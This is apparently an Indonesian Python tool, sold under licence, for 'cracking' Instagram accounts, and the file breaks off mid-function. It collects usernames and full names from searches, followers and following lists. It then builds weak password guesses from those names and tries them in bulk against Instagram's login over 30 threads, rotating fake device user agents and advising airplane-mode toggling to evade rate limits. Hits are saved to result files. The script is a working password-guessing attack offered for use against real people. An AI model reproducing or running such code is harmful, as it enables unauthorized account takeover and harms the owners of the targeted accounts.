try: 
         import os 
         import re 
         import sys 
         import time 
         import json 
         import uuid 
         import hmac 
         import random 
         import hashlib 
         import urllib 
         import requests 
         import stdiomask 
         import urllib.request 
 except ImportError as e: 
         exit(f'\n [\033[1;35m>\033[0m] module {e} belum terinstall') 
  
 from time import sleep 
 from concurrent.futures import ThreadPoolExecutor 
 from datetime import datetime 
 from bs4 import BeautifulSoup as parser 
  
 day=datetime.now().strftime("%d-%b-%Y") 
 nyMnD = 5 
 nyMxD = 10 
  
 insta_log='https://www.instagram.com/accounts/login/?force_classic_login=&' 
 url='https://www.instagram.com' 
  
 try: 
         os.mkdir('result') 
 except: 
         pass 
  
 H='\33[32;1m' #HIJAU 
 M='\33[0;36m' #MERAH 
 K='\33[1;33m' #KUNING 
 U='\033[95m' #UNGU 
 O='\033[95m' #ORANGE 
 C='\33[36;1m' #CLEAR 
 B ='\x1b[1;96m' #BIRU 
 P ='\x1b[1;97m' #PUTIH 
  
 USN="Mozilla/5.0 (Linux; Android 11; POCO M2 Pro) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)" 
  
 internal=[] 
 external=[] 
 success=[] 
 checkpoint=[] 
 loop=0 
 following=[] 
 s=requests.Session() 
  
  
 try: 
     # python 2 
         urllib_quote_plus = urllib.quote 
 except: 
     # python 3 
         urllib_quote_plus = urllib.parse.quote_plus 
  
 def cekAPI(cookie): 
         user=open('.username','r').read() 
         try: 
                 c=requests.get("https://www.instagram.com/%s/?__a=1"%(user),cookies={'cookie':cookie},headers={"user-agent":USN}) 
                 i=c.json()["graphql"]["user"] 
                 nama=i["full_name"] 
                 followers=i["edge_followed_by"]["count"] 
                 following=i["edge_follow"]["count"] 
                 external.append(f'{nama}|{followers}|{following}') 
         except ValueError: 
                 print(f'{M}>{C} Instagram Checkpoint');sleep(4) 
                 os.remove('.kukis.log') 
                 os.remove('.username') 
                 os.system('python instagram.py') 
  
         return external,user 
  
 def checkin(): 
         try: 
                 kuki=open('.kukis.log','r').read() 
         except FileNotFoundError: 
                 login() 
         ex,user=cekAPI(kuki) 
         cookie={'cookie':kuki} 
         instagram(ex,user,cookie).menu() 
  
 def login(): 
         global external 
         try: 
                 print(f'\n{M}!{C} Gunakan akun tumbal untuk login\n') 
                 us=input(f"{H}>{C} username IG: ") 
                 pw=stdiomask.getpass(prompt=f'{H}>{C} password IG: ') 
         except KeyboardInterrupt: 
                 exit(f'{M}>{C} KeyboardInterrupt terdeteksi... keluar !') 
  
         x=instagramAPI(us,pw).loginAPI() 
         if x.get('status')=='success': 
                 open('.username','a').write(us) 
                 open('.kukis.log','a').write(x.get('cookie')) 
                 cookie={'cookie':x.get('cookie')} 
                 print(f'\n{H}>{C} Login Berhasil Tod') 
                 os.system('python login.py') 
         elif x.get('status')=='checkpoint': 
                 exit(f'{M}>{C} mampus checkpoint aowkwok') 
         else: 
                 exit(f'{M}!{C} Username atau password yang anda masukan salah kontol') 
  
 def User_Agent(): 
         dpi_phone = [ 
                 '133','320','515','160','640','240','120' 
                 '800','480','225','768','216','1024'] 
         model_phone = [ 
                 'Nokia 2.4','HUAWEI','Galaxy', 
                 'Unlocked Smartphones','Nexus 6P', 
                 'Mobile Phones','Xiaomi', 
                 'samsung','OnePlus'] 
         pxl_phone = [ 
                 '623x1280','700x1245','800x1280', 
                 '1080x2340','1320x2400','1242x2688'] 
         i_version = [ 
                 '114.0.0.20.2','114.0.0.38.120', 
                 '114.0.0.20.70','114.0.0.28.120', 
                 '114.0.0.0.24','114.0.0.0.41'] 
         User_Agent = f'Instagram '+random.choice(i_version)+' Android (30/3.0; '+random.choice(dpi_phone)+'dpi; '+random.choice(pxl_phone)+'; huawei/google; '+random.choice(model_phone)+'; angler; angler; en_US)' 
  
         return User_Agent 
  
 def user_agent(): 
         resolutions = ['720x1280', '320x480', '480x800', '1024x768', '1280x720', '768x1024', '480x320'] 
         versions = ['GT-N7000', 'SM-N9000', 'GT-I9220', 'GT-I9100'] 
         dpis = ['120', '160', '320', '240'] 
  
         ver = random.choice(versions) 
         dpi = random.choice(dpis) 
         res = random.choice(resolutions) 
  
         return ( 
                 'Instagram 4.{}.{} ' 
                 'Android ({}/{}.{}.{}; {}; {}; samsung; {}; {}; smdkc210; en_US)' 
         ).format( 
                 random.randint(1, 2), 
                 random.randint(0, 2), 
                 random.randint(10, 11), 
                 random.randint(1, 3), 
                 random.randint(3, 5), 
                 random.randint(0, 5), 
                 dpi, 
                 res, 
                 ver, 
                 ver, 
         ) 
  
 def user_agentAPI(): 
         APP_VERSION = "136.0.0.34.124" 
         VERSION_CODE = "208061712" 
         DEVICES = { 
                 "one_plus_7": {"app_version": APP_VERSION,"android_version": "29","android_release": "10.0","dpi": "420dpi","resolution": "1080x2340","manufacturer": "OnePlus","device": "GM1903","model": "OnePlus7","cpu": "qcom","version_code": VERSION_CODE}, 
                 "one_plus_3": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "420dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3003","model": "OnePlus3","cpu": "qcom","version_code": VERSION_CODE}, 
                 "samsung_galaxy_s7": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G930F","model": "herolte","cpu": "samsungexynos8890","version_code": VERSION_CODE}, 
                 "huawei_mate_9_pro": {"app_version": APP_VERSION,"android_version": "24","android_release": "7.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "HUAWEI","device": "LON-L29","model": "HWLON","cpu": "hi3660","version_code": VERSION_CODE}, 
                 "samsung_galaxy_s9_plus": {"app_version": APP_VERSION,"android_version": "28","android_release": "9.0","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G965F","model": "star2qltecs","cpu": "samsungexynos9810","version_code": VERSION_CODE}, 
                 "one_plus_3t": {"app_version": APP_VERSION,"android_version": "26","android_release": "8.0","dpi": "380dpi","resolution": "1080x1920","manufacturer": "OnePlus","device": "ONEPLUS A3010","model": "OnePlus3T","cpu": "qcom","version_code": VERSION_CODE}, 
                 "lg_g5": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2392","manufacturer": "LGE/lge","device": "RS988","model": "h1","cpu": "h1","version_code": VERSION_CODE}, 
                 "zte_axon_7": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "ZTE","device": "ZTE A2017U","model": "ailsa_ii","cpu": "qcom","version_code": VERSION_CODE}, 
                 "samsung_galaxy_s7_edge": {"app_version": APP_VERSION,"android_version": "23","android_release": "6.0.1","dpi": "640dpi","resolution": "1440x2560","manufacturer": "samsung","device": "SM-G935","model": "hero2lte","cpu": "samsungexynos8890","version_code": VERSION_CODE},} 
  
         DEFAULT_DEVICE = random.choice(list(DEVICES.keys())) 
         app_version = DEVICES[DEFAULT_DEVICE]['app_version'] 
         android_version = DEVICES[DEFAULT_DEVICE]['android_version'] 
         android_release = DEVICES[DEFAULT_DEVICE]['android_release'] 
         dpi = DEVICES[DEFAULT_DEVICE]['dpi'] 
         resolution = DEVICES[DEFAULT_DEVICE]['resolution'] 
         manufacturer = DEVICES[DEFAULT_DEVICE]['manufacturer'] 
         device = DEVICES[DEFAULT_DEVICE]['device'] 
         model = DEVICES[DEFAULT_DEVICE]['model'] 
         cpu = DEVICES[DEFAULT_DEVICE]['cpu'] 
         version_code = DEVICES[DEFAULT_DEVICE]['version_code'] 
  
         USER_AGENT_BASE = f"Instagram {app_version} "+f"Android ({android_version}/{android_release}; "+f"{dpi}; {resolution}; {manufacturer}; "+f"{device}; {model}; {cpu}; en_US; {version_code})" 
  
         return USER_AGENT_BASE 
  
 class instagramAPI: 
         API_URL = 'https://i.instagram.com/api/v1/' 
         DEVICE_SETTINTS = {'manufacturer': 'Xiaomi', 
                 'model': 'HM 1SW', 
                 'android_version': 18, 
                 'android_release': '4.3'} 
         USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS) 
         IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178' 
         EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on''' 
         SIG_KEY_VERSION = '4' 
  
         def __init__(self,username,password): 
                 self.username=username 
                 self.password=password 
  
                 m = hashlib.md5() 
                 m.update(username.encode('utf-8') + password.encode('utf-8')) 
                 self.device_id = self.generateDeviceId(m.hexdigest()) 
                 self.uuid = self.generateUUID(True) 
                 self.s = requests.Session() 
  
         def generateDeviceId(self, seed): 
                 volatile_seed = "12345" 
                 m = hashlib.md5() 
                 m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8')) 
                 return 'android-' + m.hexdigest()[:16] 
  
         def generateUUID(self, type): 
                 generated_uuid = str(uuid.uuid4()) 
                 if (type): 
                         return generated_uuid 
                 else: 
                         return generated_uuid.replace('-', '') 
  
         def loginAPI(self): 
                 token=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).text 
                 crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0] 
                 self.s.headers.update({'Connection': 'close', 
                         'Accept': '*/*', 
                         'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                         'Cookie2': '$Version=1', 
                         'Accept-Language': 'en-US', 
                         'User-Agent': user_agentAPI()}) 
  
                 self.data = json.dumps({ 
                         'phone_id': self.generateUUID(True), 
                         '_csrftoken': crf_token, 
                         'username': self.username, 
                         'guid': self.uuid, 
                         'device_id': self.device_id, 
                         'password': self.password, 
                         'login_attempt_count': '0'}) 
  
                 self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format( 
                         self.generateUUID(False), 
                         urllib.request.quote(self.data) 
                 ) 
                 x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload) 
                 x_jason=json.loads(x.text) 
                 x_kukis=x.cookies.get_dict() 
                 if "logged_in_user" in x.text: 
                         kuki=";".join([v+"="+x_kukis[v] for v in x_kukis]) 
                         #id=x_jason['logged_in_user']['pk'] 
                         #nm=x_jason['logged_in_user']['full_name'] 
                         #pn=x_jason['logged_in_user']['phone_number'] 
                         return {'status':'success','cookie':kuki,'userame':self.username} 
                 elif 'challenge_required' in x.text: 
                         return {'status':'checkpoint'} 
                 else: 
                         return {'status':'login_error'} 
  
 class instagram: 
         def __init__(self,external,username,cookie): 
                 self.ext=external 
                 self.username=username 
                 self.cookie=cookie 
                 self.s=requests.Session() 
  
         def logo(self): 
                 os.system('clear') 
                 for i in external: 
                         try: 
                                 nama=i.split('|')[0] 
                                 followers=i.split('|')[1] 
                                 following=i.split('|')[2] 
                         except: 
                                 pass 
                 print(f"""{B} 
      
  __  __   ____   __  __ 
 |  \/  | / ___|  \ \/ / 
 | |\/| | \___ \   \  / 
 | |  | |  ___) |  /  \|_|  |_| |____/  /_/\_\ 
            
 {P}-----------------------------------------------------           
 {P}[•] ＥＭＡＩＬ    : iyans0048@gmail.com 
 {P}[•] ＪＯＩＮ   : - 
 {P}[•] ＳＴＡＴＵＳ      : Premium Jelas Dong 
 {P}[•] ＫＡＤＡＬＵＡＲＳＡ  : SAMPE TURU! 
 {P}[•] ＡＵＴＨＯＲ      : MSRX.X 
 {P}------------------------------------------------------ 
  
 {P} Menu pilih Satu-satu : 
  
 {H}[01]. CRACK DARI PENCARIAN 
 {H}[02]. CRACK DARI PENGIKUT 
 {H}[03]. CRACK DARI MENGIKUTI 
 {H}[04]. CRACK ULANG HASIL CRACK 
 {H}[05]. CEK HASIL CRACK 
  
 {P}[06]. BOT AUTO FOLLOW 
 {P}[07]. BELI LINCENSE 
 {P}[08]. (KELUAR) 
         """) 
  
         def BUG(self): 
                 print(f""" 
  {M}╟{C} Lisensi 1 Bulan / 250K 
  {M}╟{C} Anda bisa Beli langsung ke Whatsapp 
  {M}╟{C}  {H}[ 0812-8309-9471 ]{C} 
                 """) 
                 exit() 
  
         def Exit(self): 
                 x=input(f'\n [{M}>{C}] Apakah anda yakin ingin keluar ? [Y/T]: ') 
                 if x in ('y','Y'): 
                         os.remove('.kukis.log') 
                         os.remove('.username') 
                         os.system('python instagram.py') 
                 elif x in ('t','T'): 
                         os.system('python instagram.py') 
                 else: 
                         self.Exit() 
  
         def sixAPI(self,six_id): 
                 url = "https://www.instagram.com/web/search/topsearch/?context=blended&query="+six_id+"&rank_token=0.3953592318270893&count=1" 
                 x = requests.get(url) 
                 x_jason = x.json() 
                 uid = str( x_jason['users'][0].get("user").get("pk") ) 
                 return uid 
  
         def unfollowAPI(self,user_id,username_id,cookie): 
                 uuid=generateUUID(True) 
                 xx=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).content 
                 crf_token = re.findall('{"config":{"csrf_token":"(.*)","viewer"',str(xx))[0] 
                 s.headers.update({'Connection': 'close', 
                        'Accept': '*/*', 
                        'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 
                        'Cookie2': '$Version=1', 
                        'Accept-Language': 'en-US', 
                        'User-Agent': User_Agent()}) 
  
                 data = json.dumps({'_uuid': uuid, 
                            '_uid': username_id, 
                            'user_id': user_id, 
                            '_csrftoken': crf_token}) 
  
                 self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format( 
                         self.generateUUID(False), 
                         urllib.request.quote(data)) 
                 return s.post('https://i.instagram.com/api/v1/friendships/destroy/%s/'%(user_id),self.payload,cookies=cookie).text 
  
  
         def searchAPI(self,cookie,nama): 
                 try: 
                         x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN}) 
                         x_jason=json.loads(x.text) 
                         for i in x_jason['users']: 
                                 user=i['user'] 
                                 username=user['username'] 
                                 fullname=user['full_name'] 
                                 internal.append(f'{username}|{fullname}') 
                 except requests.exceptions.ConnectionError: 
                         exit(f'\n [{M}!{C}] Koneksi internet bermasalah') 
                 return internal 
  
         def idAPI(self,cookie,id): 
                 try: 
                         m=s.get('https://www.instagram.com/%s/?__a=1'%(id),cookies=cookie,headers={"user-agent":USN}) 
                         m_jason=m.json()["graphql"]["user"] 
                         idx=m_jason["id"] 
  
                 except requests.exceptions.ConnectionError: 
                         exit(f"\n [{M}!{C}] Koneksi internet bermasalah") 
                 except Exception as e: 
                         exit(f"\n [{M}!{C}] Username yang anda masukan tidak di temukan pastikan target bersifat publik") 
                 return idx 
  
         def infoAPI(self,cookie,api,id): 
                 try: 
                         x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN}) 
                         x_jason=json.loads(x.text) 
                         for i in x_jason['users']: 
                                 username = i["username"] 
                                 nama = i["full_name"] 
                                 internal.append(f'{username}|{nama}') 
                                 following.append(username) 
                 except requests.exceptions.ConnectionError: 
                         exit(f'\n [{M}!{C}] Koneksi internet bermasalah') 
                 except Exception as e: 
                         print(f'\n [{M}!{C}] Username yang anda masukan tidak di temukan') 
                 return internal 
  
         def passwordAPI(self,xnx): 
                 print(f'\n {H}{C} Total IG {H}{len(internal)}{C}') 
                 print(f""" 
 {P}[?] Silahkan Pilih Method Crack [?] 
  
 {H}[1]. V1 PRO (cepat) 
 {H}[2]. V2 MBASIC (lambat) 
 {H}[3]. V3 MOBILE (sangat lambat) 
                 """) 
                 c=input(f' {P}==>{C} Pilih 1 - 3 : ') 
                 if c=='1': 
                         self.generateAPI(xnx,c) 
                 elif c=='2': 
                         self.generateAPI(xnx,c) 
                 elif c=='3': 
                         self.generateAPI(xnx,c) 
                 else: 
                         self.passwordAPI(xnx) 
  
         def generateAPI(self,user,o): 
                 print(f""" 
 {P}[?] Silahkan Pilih UserAgent Anda : 
  
 {H}[1]. USER AGENT - V1 (FAST) 
 {H}[2]. USER AGENT - V2 (SLOW) 
 {H}[3]. USER AGENT - V3 (VERY SLOW) 
                 """) 
                 ua=input(f' {P}==>{C} UserAgent : ') 
                 if ua=='1': 
                         uaAPI=User_Agent() 
                 elif ua=='2': 
                         uaAPI=user_agent() 
                 elif ua=='3': 
                         uaAPI=user_agentAPI() 
  
                 print(f""" 
  {H}[{H}✓{C}] Hasil OK disimpan ke: result/{day}.txt 
  {K}[{K}X{C}] Hasil CP disimpan ke: result/{day}.txt 
  
  {M}[{M}!{C}] nyalakan mode pesawat  setiap 2 menit tod 
                 """) 
                 with ThreadPoolExecutor(max_workers=30) as shinkai: 
                         for i in user: 
                                 try: 
                                         username=i.split("|")[0] 
                                         password=i.split("|")[1].lower() 
                                         for w in password.split(" "): 
                                                 if len(w)<3: 
                                                         continue 
                                                 else: 
                                                         w=w.lower() 
                                                         if o=="1": 
                                                                 if len(w)==3 or len(w)==4 or len(w)==5: 
                                                                         sandi=[w+'123'] 
                                                                 else: 
                                                                         sandi=[w] 
                                                         elif o=="2": 
                                                                 if len(w)==3 or len(w)==4 or len(w)==5: 
                                                                         sandi=[w+'123',w] 
                                                                 else: 
                                                                         sandi=[w+'123',w] 
                                                         elif o=="3": 
                                                                 if len(w)==3 or len(w)==4 or len(w)==5: 
                                                                         sandi=[w+'123',w,password.lower()] 
                                                                 else: 
                                                                         sandi=[w+'123',w,password.lower()] 
                                                         shinkai.submit(self.crackAPI,username,sandi,uaAPI) 
                                 except: 
                                         pass 
                 exit(f'\n\n [{K}|{C}] Crack Selesai...Ajg!!!') 
  
         def APIinfo(self,user): 
                 try: 
                         x=s.get("https://www.instagram.com/%s/?__a=1"%(user),headers={"user-agent":USN}) 
                         x_jason=x.json()["graphql"]["user"] 
                         nama=x_jason["full_name"] 
                         pengikut=x_jason["edge_followed_by"]["count"] 
                         mengikut=x_jason["edge_follow"]["count"] 
                         postingan=x_jason["edge_owner_to_timeline_media"]["count"] 
                 except: 
                         pass 
  
                 return nama,pengikut,mengikut,postingan 
  
         def crackAPI(self,user,pas,uaAPI): 
                 global loop,success,checkpoint 
                 sys.stdout.write(f"\r Semoga Hasil [{K}{loop}/{len(internal)}{C}] {H}OK: - {len(success)}{C}  {K}CP: - {len(checkpoint)}{C} "), 
                 sys.stdout.flush() 
                 try: 
                         for pw in pas: 
                                 token=s.get('https://www.instagram.com/accounts/login/') 
                                 headers = { 
                                         'Host': 'www.instagram.com', 
                                         'User-Agent': uaAPI, 
                                         'Accept': '/', 
                                         'Accept-Language': 'id,en-US;q=0.7,en;q=0.3', 
                                         'Accept-Encoding': 'gzip, deflate, br', 
